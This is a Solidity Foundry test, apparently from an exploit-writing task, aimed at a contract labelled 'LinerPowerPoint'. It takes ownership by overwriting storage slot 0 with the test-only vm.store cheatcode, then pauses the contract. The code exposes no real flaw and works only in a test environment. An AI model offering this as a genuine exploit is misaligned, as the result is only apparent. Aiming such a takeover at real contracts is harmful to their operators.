pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LinerPowerPoint {
    function pause() external view returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for storage manipulation
        vm.label(TARGET, "LinerPowerPoint");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, become the owner by overwriting the owner storage slot
        // In Ownable contract, _owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwnerValue = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwnerValue);

        // Now call setPause() as the new owner
        // We need to impersonate the attacker address since we just set it as owner
        vm.prank(attacker);
        (bool success, ) = TARGET.call(abi.encodeWithSignature("setPause()"));
        require(success, "setPause() call failed");

        // Verify the pause is now true
        (bool pauseSuccess, bytes memory data) = TARGET.call(abi.encodeWithSignature("pause()"));
        require(pauseSuccess, "Call to pause() failed");
        bool isPaused = abi.decode(data, (bool));
        require(isPaused, "Pause should be true");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
